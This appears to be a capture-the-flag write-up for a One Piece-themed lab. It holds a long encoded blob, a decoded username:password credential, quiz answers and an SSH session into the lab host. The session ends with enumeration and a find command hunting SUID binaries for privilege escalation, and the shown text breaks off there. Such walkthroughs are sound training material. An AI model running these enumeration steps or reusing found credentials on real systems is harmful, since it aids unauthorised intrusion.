ORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVhDMkxKTkZVRkMyTEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMklCTkZVV1MyTElLRlVXUzJMSk5FQVdTMkxKTkZVUUM0TEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXUVVMSk5GVVdTMklCT0ZVV1MyTEpBRllXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRllXUzJMSk5CSVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCTkZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMSk5GVVdTMkNSTkZVV1MyTEpBRlVXUzJMSk5FQVhDMkxKTkZVUUM0TEpORlVXU0FMSk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVRkMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEpBRlVXUzJMSk5FQVdTMkxKTkZVUUMyTEpORlVXU0FMUk5GVVdTMklCT0ZVV1MyTEk9

M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!




```

![[Pasted image 20230707170533.png]]
![[Pasted image 20230707171744.png]]

What is the name of the tree that contains the 1st Road Poneglyph?  

*the whale*

What is the name of the 1st pirate you meet navigating the Apache Sea?  

Only Sea, It's Not Terrible

*Donquixote Doflamingo*

What is the name of the 2nd island you reach navigating the Apache Sea?

*Whole Cake*

What is the name of the friend you meet navigating the Apache Sea?

*Buggy the Clown*

What is the name of the 2nd Emperor you meet navigating the Apache Sea?  

*Kaido of the Beasts*

What is the hidden message of the 4 Road Poneglyphs?

*M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!*

### Task 3  Laugh Tale

You are now able to reach Laugh Tale. Can you find the One Piece?  

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ ssh M0nk3y_D_7uffy@10.10.220.152                    
The authenticity of host '10.10.220.152 (10.10.220.152)' can't be established.
ED25519 key fingerprint is SHA256:nL2dVf0XNxY1c00+jMSTep+9eHaHoDI9XIfe/nIVlRA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.220.152' (ED25519) to the list of known hosts.
M0nk3y_D_7uffy@10.10.220.152's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-041500-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


18 packages can be updated.
13 updates are security updates.

Last login: Fri Aug 14 15:23:58 2020 from 192.168.1.7
M0nk3y_D_7uffy@Laugh-Tale:~$ id
uid=1001(M0nk3y_D_7uffy) gid=1001(luffy) groups=1001(luffy)
M0nk3y_D_7uffy@Laugh-Tale:~$ ls -lah
total 56K
drwxr-xr-x  8 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .
drwxr-xr-x  4 root           root  4.0K Jul 26  2020 ..
-rw-------  1 M0nk3y_D_7uffy luffy   14 Aug 14  2020 .bash_history
-rw-r--r--  1 M0nk3y_D_7uffy luffy  220 Jul 26  2020 .bash_logout
-rw-r--r--  1 M0nk3y_D_7uffy luffy 3.7K Jul 26  2020 .bashrc
drwx------ 11 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .cache
drwx------ 11 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .config
drwx------  3 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .gnupg
-rw-------  1 M0nk3y_D_7uffy luffy  334 Jul 29  2020 .ICEauthority
-rw-r--r--  1 root           root   283 Jul 26  2020 laugh_tale.txt
drwx------  3 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .local
drwx------  5 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .mozilla
-rw-r--r--  1 M0nk3y_D_7uffy luffy  807 Jul 26  2020 .profile
drwx------  2 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .ssh
M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt 
Finally, we reached Laugh Tale.
All is left to do is to find the One Piece.
Wait, there is another boat in here.
Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.
You want your revenge. Let's take him down !

M0nk3y_D_7uffy@Laugh-Tale:~$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
